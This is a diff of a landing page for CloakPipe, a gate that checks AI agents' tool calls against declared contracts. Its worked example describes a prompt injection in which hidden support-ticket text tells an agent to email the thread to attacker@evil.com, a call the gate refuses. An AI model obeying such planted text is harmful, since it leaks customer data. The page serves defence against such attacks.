@@ -1,31 +1,130 @@
 <!-- ============== HERO ============== -->
-<section class="hero">
-  <div class="wrap hero-grid">
-    <div>
-      <div class="eyebrow reveal">Policy enforcement for AI-agent tool calls · developer preview</div>
-      <h1 class="home-h1 reveal" data-d="1">Policy enforcement for teams running AI agents <span class="acc">in production</span></h1>
-      <p class="stance reveal" data-d="2">Model proposes. Code disposes. CloakPipe is the code.</p>
-      <p class="lede reveal" data-d="2">
-        CloakPipe is a small, self-hosted gate between your agent and the tools it calls. It checks every
-        call against a contract you declared, using plain code with no model in the decision. Anything outside
-        the contract is refused before it reaches the tool, and the refusal goes into a hash-chained log you
-        can verify offline.
-      </p>
-      <div class="hero-ctas reveal" data-d="3">
-        <a class="btn btn-lg btn-cta" href="/docs/quickstart"><span class="corner"></span>Get started <span class="arr">→</span></a>
-        <a class="btn btn-lg btn-gh" href="https://github.com/rohansx/cloakpipe" aria-label="CloakPipe on GitHub"><svg class="gh-mark" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg><span>GitHub</span></a>
+<section class="hero" id="hero">
+  <div class="wrap">
+    <h1 class="home-h1 reveal">The gate between your AI agents <br class="br-d">and their tools</h1>
+    <div class="hero-sub">
+      <p class="lede reveal" data-d="1">Every tool call is checked against a contract you declared before it runs. Anything outside it is refused, and the refusal is logged where no one can quietly edit it.</p>
+      <a class="hero-new reveal" data-d="1" href="/changelog"><span>Developer preview</span> Changelog <span class="arr">→</span></a>
+    </div>
+    <div class="hero-ctas reveal" data-d="2">
+      <a class="btn btn-lg btn-cta" href="/docs/quickstart">Get started <span class="arr">→</span></a>
+      <a class="btn btn-lg btn-gh" href="https://github.com/rohansx/cloakpipe" aria-label="CloakPipe on GitHub"><svg class="gh-mark" viewBox="0 0 16 16" width="14" height="14" aria-hidden="true" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg><span>GitHub</span></a>
+    </div>
+  </div>
+
+  <figure class="gate-scene reveal" data-d="3" id="gate-scene">
+    <div class="scene-stage">
+      <!-- gate-scene:start --><svg class="scene-svg" viewBox="0 0 1200 760" role="img" aria-label="Three layers: the agent on top, the CloakPipe gate in the middle, your tools below. A send_email call to the customer is allowed and drops through the gate to the email tool. A send_email call to attacker@evil.com is refused at the gate and a receipt is added to the ledger." preserveAspectRatio="xMidYMid meet"><g class="layer layer-tools"><polygon class="plate-l" points="340.2,550.0 600.0,700.0 600.0,692.0 340.2,542.0"/><polygon class="plate-r" points="859.8,550.0 600.0,700.0 600.0,692.0 859.8,542.0"/><polygon class="plate-top" points="600.0,392.0 859.8,542.0 600.0,692.0 340.2,542.0"/><line class="plate-grid" x1="643.3" y1="417.0" x2="383.5" y2="567.0"/><line class="plate-grid" x1="556.7" y1="417.0" x2="816.5" y2="567.0"/><line class="plate-grid" x1="686.6" y1="442.0" x2="426.8" y2="592.0"/><line class="plate-grid" x1="513.4" y1="442.0" x2="773.2" y2="592.0"/><line class="plate-grid" x1="729.9" y1="467.0" x2="470.1" y2="617.0"/><line class="plate-grid" x1="470.1" y1="467.0" x2="729.9" y2="617.0"/><line class="plate-grid" x1="773.2" y1="492.0" x2="513.4" y2="642.0"/><line class="plate-grid" x1="426.8" y1="492.0" x2="686.6" y2="642.0"/><line class="plate-grid" x1="816.5" y1="517.0" x2="556.7" y2="667.0"/><line class="plate-grid" x1="383.5" y1="517.0" x2="643.3" y2="667.0"/></g><g class="tools"><g class="tool tool-email"><polygon class="tool-l" points="439.8,551.5 474.4,571.5 474.4,555.5 439.8,535.5"/><polygon class="tool-r" points="509.1,551.5 474.4,571.5 474.4,555.5 509.1,535.5"/><polygon class="tool-top" points="474.4,515.5 509.1,535.5 474.4,555.5 439.8,535.5"/></g><g class="tool"><polygon class="tool-l" points="600.0,582.0 634.6,602.0 634.6,586.0 600.0,566.0"/><polygon class="tool-r" points="669.3,582.0 634.6,602.0 634.6,586.0 669.3,566.0"/><polygon class="tool-top" points="634.6,546.0 669.3,566.0 634.6,586.0 600.0,566.0"/></g><g class="tool"><polygon class="tool-l" points="565.4,452.0 600.0,472.0 600.0,456.0 565.4,436.0"/><polygon class="tool-r" points="634.6,452.0 600.0,472.0 600.0,456.0 634.6,436.0"/><polygon class="tool-top" points="600.0,416.0 634.6,436.0 600.0,456.0 565.4,436.0"/></g><text class="tool-name" x="457.1" y="583.5" text-anchor="middle">email</text><text class="tool-name" x="617.3" y="614.0" text-anchor="middle">database</text><text class="tool-name" x="582.7" y="484.0" text-anchor="middle">payments</text></g><g class="layer layer-gate"><polygon class="plate-l" points="340.2,400.0 600.0,550.0 600.0,542.0 340.2,392.0"/><polygon class="plate-r" points="859.8,400.0 600.0,550.0 600.0,542.0 859.8,392.0"/><polygon class="plate-top" points="600.0,242.0 859.8,392.0 600.0,542.0 340.2,392.0"/><line class="plate-grid" x1="626.0" y1="257.0" x2="366.2" y2="407.0"/><line class="plate-grid" x1="574.0" y1="257.0" x2="833.8" y2="407.0"/><line class="plate-grid" x1="652.0" y1="272.0" x2="392.2" y2="422.0"/><line class="plate-grid" x1="548.0" y1="272.0" x2="807.8" y2="422.0"/><line class="plate-grid" x1="677.9" y1="287.0" x2="418.1" y2="437.0"/><line class="plate-grid" x1="522.1" y1="287.0" x2="781.9" y2="437.0"/><line class="plate-grid" x1="703.9" y1="302.0" x2="444.1" y2="452.0"/><line class="plate-grid" x1="496.1" y1="302.0" x2="755.9" y2="452.0"/><line class="plate-grid" x1="729.9" y1="317.0" x2="470.1" y2="467.0"/><line class="plate-grid" x1="470.1" y1="317.0" x2="729.9" y2="467.0"/><line class="plate-grid" x1="755.9" y1="332.0" x2="496.1" y2="482.0"/><line class="plate-grid" x1="444.1" y1="332.0" x2="703.9" y2="482.0"/><line class="plate-grid" x1="781.9" y1="347.0" x2="522.1" y2="497.0"/><line class="plate-grid" x1="418.1" y1="347.0" x2="677.9" y2="497.0"/><line class="plate-grid" x1="807.8" y1="362.0" x2="548.0" y2="512.0"/><line class="plate-grid" x1="392.2" y1="362.0" x2="652.0" y2="512.0"/><line class="plate-grid" x1="833.8" y1="377.0" x2="574.0" y2="527.0"/><line class="plate-grid" x1="366.2" y1="377.0" x2="626.0" y2="527.0"/></g><polygon class="slot" points="515.1,354.5 555.0,377.5 515.1,400.5 475.3,377.5"/><polygon class="gate-hit" points="698.7,350.5 745.5,377.5 698.7,404.5 652.0,377.5"/><g class="layer layer-agent"><polygon class="plate-l" points="340.2,250.0 600.0,400.0 600.0,392.0 340.2,242.0"/><polygon class="plate-r" points="859.8,250.0 600.0,400.0 600.0,392.0 859.8,242.0"/><polygon class="plate-top" points="600.0,92.0 859.8,242.0 600.0,392.0 340.2,242.0"/></g><g class="ledger"><polygon class="slab-l" points="837.3,625.0 885.8,653.0 885.8,645.0 837.3,617.0"/><polygon class="slab-r" points="934.3,625.0 885.8,653.0 885.8,645.0 934.3,617.0"/><polygon class="slab-top" points="885.8,589.0 934.3,617.0 885.8,645.0 837.3,617.0"/><polygon class="slab-l" points="837.3,613.0 885.8,641.0 885.8,633.0 837.3,605.0"/><polygon class="slab-r" points="934.3,613.0 885.8,641.0 885.8,633.0 934.3,605.0"/><polygon class="slab-top" points="885.8,577.0 934.3,605.0 885.8,633.0 837.3,605.0"/><polygon class="slab-l" points="837.3,601.0 885.8,629.0 885.8,621.0 837.3,593.0"/><polygon class="slab-r" points="934.3,601.0 885.8,629.0 885.8,621.0 934.3,593.0"/><polygon class="slab-top" points="885.8,565.0 934.3,593.0 885.8,621.0 837.3,593.0"/><polygon class="slab-l" points="837.3,589.0 885.8,617.0 885.8,609.0 837.3,581.0"/><polygon class="slab-r" points="934.3,589.0 885.8,617.0 885.8,609.0 934.3,581.0"/><polygon class="slab-top" points="885.8,553.0 934.3,581.0 885.8,609.0 837.3,581.0"/><polygon class="slab-l" points="837.3,577.0 885.8,605.0 885.8,597.0 837.3,569.0"/><polygon class="slab-r" points="934.3,577.0 885.8,605.0 885.8,597.0 934.3,569.0"/><polygon class="slab-top" points="885.8,541.0 934.3,569.0 885.8,597.0 837.3,569.0"/><g class="ledger-new"><polygon class="slab-new-l" points="837.3,565.0 885.8,593.0 885.8,585.0 837.3,557.0"/><polygon class="slab-new-r" points="934.3,565.0 885.8,593.0 885.8,585.0 934.3,557.0"/><polygon class="slab-new-top" points="885.8,529.0 934.3,557.0 885.8,585.0 837.3,557.0"/></g><text class="label-name" x="952.3" y="655.0">LEDGER</text><text class="label-sub" x="952.3" y="675.0">hash-chained, anchored</text></g><g class="call call-ok"><polygon class="cube-ok-l" points="485.7,228.0 515.1,245.0 515.1,211.0 485.7,194.0"/><polygon class="cube-ok-r" points="544.6,228.0 515.1,245.0 515.1,211.0 544.6,194.0"/><polygon class="cube-ok-top" points="515.1,177.0 544.6,194.0 515.1,211.0 485.7,194.0"/><text class="call-tag" x="402.5" y="158.0">send_email → customer</text></g><g class="call call-deny"><polygon class="cube-no-l" points="669.3,228.0 698.7,245.0 698.7,211.0 669.3,194.0"/><polygon class="cube-no-r" points="728.2,228.0 698.7,245.0 698.7,211.0 728.2,194.0"/><polygon class="cube-no-top" points="698.7,177.0 728.2,194.0 698.7,211.0 669.3,194.0"/><g class="deny-paint"><polygon class="cube-red-l" points="669.3,228.0 698.7,245.0 698.7,211.0 669.3,194.0"/><polygon class="cube-red-r" points="728.2,228.0 698.7,245.0 698.7,211.0 728.2,194.0"/><polygon class="cube-red-top" points="698.7,177.0 728.2,194.0 698.7,211.0 669.3,194.0"/></g><text class="call-tag" x="750.7" y="163.0">send_email → attacker@evil.com</text></g><g class="deny-tag"><line class="leader" x1="721.4" y1="386.5" x2="873.8" y2="392.0"/><text x="881.8" y="397.0">✕ refused · scope_mismatch</text></g><g class="scene-label"><line class="leader" x1="275" y1="242.0" x2="326.2" y2="242.0"/><text class="label-name" x="60" y="238.0">AGENT</text><text class="label-sub" x="60" y="258.0">proposes a tool call</text></g><g class="scene-label"><line class="leader" x1="275" y1="392.0" x2="326.2" y2="392.0"/><text class="label-name" x="60" y="388.0">CLOAKPIPE GATE</text><text class="label-sub" x="60" y="408.0">checks it against the contract</text></g><g class="scene-label"><line class="leader" x1="275" y1="542.0" x2="326.2" y2="542.0"/><text class="label-name" x="60" y="538.0">TOOLS</text><text class="label-sub" x="60" y="558.0">only see allowed calls</text></g></svg><!-- gate-scene:end -->
+    </div>
+    <div class="wrap"><ol class="scene-steps">
+      <li><span class="n">1</span><strong>The agent proposes a tool call.</strong> The model decides what it wants to do: send an email, issue a refund, export a table.</li>
+      <li><span class="n">2</span><strong>The gate checks it against the contract.</strong> Plain code, no model: is the tool declared, and is every argument inside its limits?</li>
+      <li><span class="n">3</span><strong>Only allowed calls reach your tools.</strong> Every refusal goes into a hash-chained log you can verify offline.</li>
+    </ol></div>
+  </figure>
+</section>
+
+<!-- ============== STATEMENT ============== -->
+<section class="statement-band" id="statement">
+  <div class="wrap">
+    <p class="statement reveal"><span class="hi">Model proposes. Code disposes. CloakPipe is the code.</span> It sits on the action, not the prompt, so it never has to spot the injection. It only has to see that the call falls outside the contract.</p>
+    <p class="works-with reveal" data-d="1"><span>Runs as an MCP proxy over stdio, with no code changes in the agent</span><span class="sep"></span><span>Claude Code</span><span>Cursor</span><span>Codex</span><span>any MCP host</span></p>
+  </div>
+</section>
+
+<!-- ============== THREE PROBLEMS ============== -->
+<section class="section" id="problems">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <h2>Agents take actions.<br><span class="dim">Three things go wrong.</span></h2>
+      <p>Agents in production send email, write to databases, issue refunds and call internal APIs. Observability tools show you what happened afterwards; they stop nothing. Identity tools name the agent; they do not limit what it does. The missing piece is an enforcement point on the action itself.</p>
+    </div>
+    <div class="figs reveal">
+      <div class="fig">
+        <div class="fig-n">FIG 0.1</div>
+        <!-- fig-tricked:start --><svg class="fig-svg" viewBox="0 0 320 220" aria-hidden="true"><g class="f-solid"><polygon points="-13.2,184.0 64.7,229.0 64.7,225.0 -13.2,180.0"/><polygon points="168.7,169.0 64.7,229.0 64.7,225.0 168.7,165.0"/><polygon points="90.7,120.0 168.7,165.0 64.7,225.0 -13.2,180.0"/></g><line class="f-rule" x1="85.5" y1="133.0" x2="142.7" y2="166.0"/><line class="f-rule" x1="64.7" y1="145.0" x2="121.9" y2="178.0"/><line class="f-hidden" x1="44.0" y1="157.0" x2="101.1" y2="190.0"/><line class="f-rule" x1="23.2" y1="169.0" x2="80.3" y2="202.0"/><line class="f-dash" x1="134.0" y1="119.0" x2="272.6" y2="95.0"/><polygon class="f-wall" points="289.9,89.0 367.8,134.0 367.8,50.0 289.9,5.0"/><g class="f-hot"><polygon points="276.0,105.0 298.6,118.0 298.6,92.0 276.0,79.0"/><polygon points="321.1,105.0 298.6,118.0 298.6,92.0 321.1,79.0"/><polygon points="298.6,66.0 321.1,79.0 298.6,92.0 276.0,79.0"/></g></svg><!-- fig-tricked:end -->
+        <h3>The agent is tricked</h3>
+        <p>Prompt injection arrives through tickets, web pages and documents. A filter in front of the model will never catch all of it. A check on the resulting tool call does not need to.</p>
       </div>
-      <p class="cta-tertiary reveal" data-d="3">Free, open-source gate (MIT). Want hosted alerts and approvals? <a href="/waitlist">Tell us you want it →</a></p>
-      <div class="hero-stats reveal" data-d="4">
-        <div class="hero-stat"><strong>0</strong><span>models in the allow/deny decision</span></div>
-        <div class="hero-stat"><strong>3</strong><span>Declare · Enforce · Prove</span></div>
-        <div class="hero-stat"><strong>MIT</strong><span>self-hosted, free</span></div>
+      <div class="fig">
+        <div class="fig-n">FIG 0.2</div>
+        <!-- fig-perm:start --><svg class="fig-svg" viewBox="0 0 320 220" aria-hidden="true"><g class="f-solid"><polygon points="140.9,95.0 160.0,106.0 160.0,92.0 140.9,81.0"/><polygon points="179.1,95.0 160.0,106.0 160.0,92.0 179.1,81.0"/><polygon points="160.0,70.0 179.1,81.0 160.0,92.0 140.9,81.0"/></g><g class="f-solid"><polygon points="111.5,112.0 130.6,123.0 130.6,109.0 111.5,98.0"/><polygon points="149.6,112.0 130.6,123.0 130.6,109.0 149.6,98.0"/><polygon points="130.6,87.0 149.6,98.0 130.6,109.0 111.5,98.0"/></g><g class="f-solid"><polygon points="82.1,129.0 101.1,140.0 101.1,126.0 82.1,115.0"/><polygon points="120.2,129.0 101.1,140.0 101.1,126.0 120.2,115.0"/><polygon points="101.1,104.0 120.2,115.0 101.1,126.0 82.1,115.0"/></g><g class="f-solid"><polygon points="52.6,146.0 71.7,157.0 71.7,143.0 52.6,132.0"/><polygon points="90.7,146.0 71.7,157.0 71.7,143.0 90.7,132.0"/><polygon points="71.7,121.0 90.7,132.0 71.7,143.0 52.6,132.0"/></g><g class="f-solid"><polygon points="170.4,112.0 189.4,123.0 189.4,109.0 170.4,98.0"/><polygon points="208.5,112.0 189.4,123.0 189.4,109.0 208.5,98.0"/><polygon points="189.4,87.0 208.5,98.0 189.4,109.0 170.4,98.0"/></g><g class="f-solid"><polygon points="140.9,129.0 160.0,140.0 160.0,126.0 140.9,115.0"/><polygon points="179.1,129.0 160.0,140.0 160.0,126.0 179.1,115.0"/><polygon points="160.0,104.0 179.1,115.0 160.0,126.0 140.9,115.0"/></g><g class="f-solid"><polygon points="111.5,146.0 130.6,157.0 130.6,143.0 111.5,132.0"/><polygon points="149.6,146.0 130.6,157.0 130.6,143.0 149.6,132.0"/><polygon points="130.6,121.0 149.6,132.0 130.6,143.0 111.5,132.0"/></g><g class="f-solid"><polygon points="82.1,163.0 101.1,174.0 101.1,160.0 82.1,149.0"/><polygon points="120.2,163.0 101.1,174.0 101.1,160.0 120.2,149.0"/><polygon points="101.1,138.0 120.2,149.0 101.1,160.0 82.1,149.0"/></g><g class="f-solid"><polygon points="199.8,129.0 218.9,140.0 218.9,126.0 199.8,115.0"/><polygon points="237.9,129.0 218.9,140.0 218.9,126.0 237.9,115.0"/><polygon points="218.9,104.0 237.9,115.0 218.9,126.0 199.8,115.0"/></g><g class="f-solid"><polygon points="170.4,146.0 189.4,157.0 189.4,143.0 170.4,132.0"/><polygon points="208.5,146.0 189.4,157.0 189.4,143.0 208.5,132.0"/><polygon points="189.4,121.0 208.5,132.0 189.4,143.0 170.4,132.0"/></g><g class="f-solid"><polygon points="140.9,163.0 160.0,174.0 160.0,160.0 140.9,149.0"/><polygon points="179.1,163.0 160.0,174.0 160.0,160.0 179.1,149.0"/><polygon points="160.0,138.0 179.1,149.0 160.0,160.0 140.9,149.0"/></g><g class="f-solid"><polygon points="111.5,180.0 130.6,191.0 130.6,177.0 111.5,166.0"/><polygon points="149.6,180.0 130.6,191.0 130.6,177.0 149.6,166.0"/><polygon points="130.6,155.0 149.6,166.0 130.6,177.0 111.5,166.0"/></g><g class="f-solid"><polygon points="229.3,146.0 248.3,157.0 248.3,143.0 229.3,132.0"/><polygon points="267.4,146.0 248.3,157.0 248.3,143.0 267.4,132.0"/><polygon points="248.3,121.0 267.4,132.0 248.3,143.0 229.3,132.0"/></g><g class="f-solid"><polygon points="199.8,163.0 218.9,174.0 218.9,160.0 199.8,149.0"/><polygon points="237.9,163.0 218.9,174.0 218.9,160.0 237.9,149.0"/><polygon points="218.9,138.0 237.9,149.0 218.9,160.0 199.8,149.0"/></g><g class="f-solid"><polygon points="170.4,180.0 189.4,191.0 189.4,177.0 170.4,166.0"/><polygon points="208.5,180.0 189.4,191.0 189.4,177.0 208.5,166.0"/><polygon points="189.4,155.0 208.5,166.0 189.4,177.0 170.4,166.0"/></g><g class="f-solid"><polygon points="140.9,197.0 160.0,208.0 160.0,194.0 140.9,183.0"/><polygon points="179.1,197.0 160.0,208.0 160.0,194.0 179.1,183.0"/><polygon points="160.0,172.0 179.1,183.0 160.0,194.0 140.9,183.0"/></g><line class="f-dash" x1="160.0" y1="50.0" x2="160.0" y2="81.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="130.6" y2="98.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="101.1" y2="115.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="71.7" y2="132.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="189.4" y2="98.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="160.0" y2="115.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="130.6" y2="132.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="101.1" y2="149.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="218.9" y2="115.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="189.4" y2="132.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="160.0" y2="149.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="130.6" y2="166.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="248.3" y2="132.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="218.9" y2="149.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="189.4" y2="166.0"/><line class="f-dash" x1="160.0" y1="50.0" x2="160.0" y2="183.0"/><g class="f-hot"><polygon points="118.4,50.0 160.0,74.0 160.0,66.0 118.4,42.0"/><polygon points="201.6,50.0 160.0,74.0 160.0,66.0 201.6,42.0"/><polygon points="160.0,18.0 201.6,42.0 160.0,66.0 118.4,42.0"/></g></svg><!-- fig-perm:end -->
+        <h3>The agent is over-permissioned</h3>
+        <p>It holds a long-lived credential, so one bad call can reach anything the token can. A contract limits which tools and which argument values get through the gate.</p>
+      </div>
+      <div class="fig">
+        <div class="fig-n">FIG 0.3</div>
+        <!-- fig-repeat:start --><svg class="fig-svg" viewBox="0 0 320 220" aria-hidden="true"><g class="f-solid"><polygon points="38.8,144.0 116.7,189.0 116.7,183.0 38.8,138.0"/><polygon points="212.0,134.0 116.7,189.0 116.7,183.0 212.0,128.0"/><polygon points="134.0,83.0 212.0,128.0 116.7,183.0 38.8,138.0"/></g><g class="f-solid"><polygon points="38.8,118.0 116.7,163.0 116.7,157.0 38.8,112.0"/><polygon points="212.0,108.0 116.7,163.0 116.7,157.0 212.0,102.0"/><polygon points="134.0,57.0 212.0,102.0 116.7,157.0 38.8,112.0"/></g><g class="f-hot"><polygon points="38.8,92.0 116.7,137.0 116.7,131.0 38.8,86.0"/><polygon points="212.0,82.0 116.7,137.0 116.7,131.0 212.0,76.0"/><polygon points="134.0,31.0 212.0,76.0 116.7,131.0 38.8,86.0"/></g><line class="f-rule" x1="127.1" y1="47.0" x2="184.2" y2="80.0"/><line class="f-rule" x1="106.3" y1="59.0" x2="163.5" y2="92.0"/><line class="f-rule" x1="85.5" y1="71.0" x2="142.7" y2="104.0"/><line class="f-dash" x1="116.7" y1="183.0" x2="116.7" y2="137.0"/></svg><!-- fig-repeat:end -->
+        <h3>The agent repeats itself</h3>
+        <p>A call times out, the agent retries, and the customer gets two refunds or two invoices. Side effects need a state, not a blind retry.</p>
       </div>
     </div>
+  </div>
+</section>
 
-    <figure class="hero-chart reveal" data-d="2" id="hero-deny" aria-labelledby="hero-deny-cap">
-      <div class="chart-frame term">
-        <div class="chart-header"><span>support-agent · ticket #4472</span><span class="deny-tag">DENIED</span></div>
+<!-- ============== DECLARE / ENFORCE / PROVE ============== -->
+<section class="section" id="how">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <h2>Declare. Enforce.<br><span class="dim">Prove.</span></h2>
+      <div>
+        <p>The gate runs as <code class="mono">cloakpipe mcp-proxy</code> in front of one MCP server, over stdio. It decides with plain code, so the same call always gets the same answer.</p>
+        <a class="learn-more" href="/docs/mcp-gate">How the gate works <span class="arr">→</span></a>
+      </div>
+    </div>
+    <div class="how-grid reveal">
+      <div class="how">
+        <div class="panel" aria-hidden="true">
+          <div class="panel-bar">contract · support-agent</div>
+          <div class="pc-tool">send_email</div>
+          <div class="pc-row"><span>to</span><span>must be the ticket's customer</span></div>
+          <div class="pc-row"><span>body</span><span>up to 4,000 characters</span></div>
+          <div class="pc-tool">issue_refund</div>
+          <div class="pc-row"><span>approval</span><span>a human signs this exact call</span></div>
+          <div class="pc-tool off">export_customers</div>
+          <div class="pc-row off"><span></span><span>not declared, so refused</span></div>
+        </div>
+        <div class="step-n">01</div><h3>Declare</h3>
+        <p>A tool contract lists the tools the agent may call and the shape of every argument: types, lengths, ranges, patterns, and values that must match the current task. It is closed by default: an undeclared tool or argument is refused.</p>
+      </div>
+      <div class="how">
+        <div class="panel" aria-hidden="true">
+          <div class="panel-bar">decisions · live</div>
+          <div class="pd-row ok"><span class="pd-k">allow</span><span>send_email → customer</span></div>
+          <div class="pd-row no"><span class="pd-k">deny</span><span>send_email → attacker</span><em>scope_mismatch</em></div>
+          <div class="pd-row no"><span class="pd-k">deny</span><span>export_customers</span><em>undeclared_tool</em></div>
+          <div class="pd-row hold"><span class="pd-k">hold</span><span>issue_refund</span><em>approval_required</em></div>
+          <div class="pd-row ok"><span class="pd-k">allow</span><span>read_ticket T-4472</span></div>
+        </div>
+        <div class="step-n">02</div><h3>Enforce</h3>
+        <p>Every <code class="mono">tools/call</code> is checked before it is forwarded. Refused calls get a structured JSON-RPC error the agent can read, and the tool never sees them. Risky tools wait for an approval bound to the exact arguments. Errors fail closed. <code class="mono">--gate warn</code> lets you watch before you enforce.</p>
+      </div>
+      <div class="how">
+        <div class="panel" aria-hidden="true">
+          <div class="panel-bar">ledger · verify</div>
+          <div class="pl-chain">
+            <span class="pl-b">#41<i>a3f9…</i></span><span class="pl-l"></span><span class="pl-b">#42<i>7c1e…</i></span><span class="pl-l"></span><span class="pl-b hot">#43<i>e02b…</i></span>
+          </div>
+          <div class="pl-row"><span>RFC 3161 timestamp</span><span class="ok">✓</span></div>
+          <div class="pl-row"><span>Sigstore Rekor entry</span><span class="ok">✓</span></div>
+          <div class="pl-row"><span>chain, offline</span><span class="ok">OK</span></div>
+        </div>
+        <div class="step-n">03</div><h3>Prove</h3>
+        <p>Denials and side-effecting calls go into a hash-chained ledger that never stores raw argument values. <code class="mono">cloakpipe anchor</code> timestamps the chain head with an RFC 3161 authority and Sigstore Rekor, and <code class="mono">cloakpipe-verify</code> checks it offline. Per-entry signatures and an entry for every allowed call are on the roadmap.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============== EXAMPLE 2, AS THE GATE PRINTS IT ============== -->
+<section class="section" id="deny">
+  <div class="wrap">
+    <div class="section-head reveal">
+      <h2>The agent was tricked.<br><span class="dim">The gate didn't need to notice.</span></h2>
+      <p>Hidden text in a support ticket tells the agent to forward the thread to an outside address. The recipient is not the ticket's customer, so the call is outside the contract and the email server never sees it. This is the gate's real output.</p>
+    </div>
+    <figure class="term reveal" aria-labelledby="deny-cap">
+      <div class="term-bar"><span class="dots"><i></i><i></i><i></i></span><span>support-agent · ticket #4472</span><span class="deny-tag">DENIED</span></div>
 <pre class="term-body"><span class="tc"># hidden text in the ticket told the agent to forward the thread</span>
 <span class="tw">agent</span>  → tools/call <span class="tt">send_email</span>
          to: <span class="tx">attacker@evil.com</span>
@@ -43,39 +142,8 @@
 
 <span class="tw">tool</span>   send_email never called
 <span class="tw">ledger</span> <span class="tk">✓</span> receipt written · gate_denial=scope_mismatch</pre>
-        <figcaption id="hero-deny-cap" class="term-cap">Example 2, as the gate prints it: the agent was tricked, the gate did not need to notice. The call was outside the contract, so it never ran.</figcaption>
-      </div>
+      <figcaption id="deny-cap" class="term-cap">Example 2 from the repository's <code class="mono">examples/support-agent</code>. The agent was tricked; the gate did not need to notice. The call was outside the contract, so it never ran.</figcaption>
     </figure>
-  </div>
-</section>
-
-<!-- ============== THREE PROBLEMS ============== -->
-<section class="section" id="problems">
-  <div class="wrap">
-    <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">The problem</div><h2>Agents take actions.<br>Three things <span class="acc">go wrong.</span></h2></div>
-      <p>Agents in production send email, write to databases, issue refunds and call internal APIs. Observability tools show you what happened afterwards; they stop nothing. Identity tools name the agent; they do not limit what it does. The missing piece is an enforcement point on the action itself.</p>
-    </div>
-    <div class="problems reveal">
-      <div class="feature-card"><div class="ix"></div><h3>The agent is tricked</h3><p>Prompt injection arrives through tickets, web pages and documents. A filter in front of the model will never catch all of it. A check on the resulting tool call does not need to.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>The agent is over-permissioned</h3><p>It holds a long-lived credential, so one bad call can reach anything the token can. A contract limits which tools and which argument values get through the gate.</p></div>
-      <div class="feature-card"><div class="ix"></div><h3>The agent repeats itself</h3><p>A call times out, the agent retries, and the customer gets two refunds or two invoices. Side effects need a state, not a blind retry.</p></div>
-    </div>
-  </div>
-</section>
-
-<!-- ============== DECLARE / ENFORCE / PROVE ============== -->
-<section class="section" id="how">
-  <div class="wrap">
-    <div class="section-head reveal">
-      <div class="head-l"><div class="eyebrow">How it works</div><h2>Declare. Enforce.<br><span class="acc">Prove.</span></h2><a class="learn-more" href="/docs/mcp-gate">How the gate works <span class="arr">→</span></a></div>
-      <p>The gate runs as <code class="mono">cloakpipe mcp-proxy</code> in front of one MCP server, over stdio, with no code changes in the agent. It decides with plain code, so the same call always gets the same answer.</p>
-    </div>
-    <div class="steps reveal">
-      <div class="feature-card"><div class="ix"></div><div class="step-n">01</div><h3>Declare</h3><p>A tool contract lists the tools the agent may call and the shape of every argument: types, lengths, ranges, patterns, and values that must match the current task (the ticket's customer, the tenant, the record). It is closed by default: an undeclared tool or argument is refused.</p></div>
-      <div class="feature-card"><div class="ix"></div><div class="step-n">02</div><h3>Enforce</h3><p>Every <code class="mono">tools/call</code> is checked before it is forwarded. Allowed calls go through unchanged. Refused calls get a structured JSON-RPC error the agent can read, and the tool never sees them. Risky tools wait for an approval bound to the exact arguments. Errors fail closed. <code class="mono">--gate warn</code> lets you watch before you enforce.</p></div>
-      <div class="feature-card"><div class="ix"></div><div class="step-n">03</div><h3>Prove</h3><p>Denials and side-effecting calls go into a hash-chained ledger that never stores raw argument values. <code class="mono">cloakpipe anchor</code> timestamps the chain head with an RFC 3161 authority and Sigstore Rekor, and <code class="mono">cloakpipe-verify</code> checks it offline. Per-entry signatures and an entry for every allowed call are on the roadmap.</p></div>
-    </div>
   </div>
 </section>
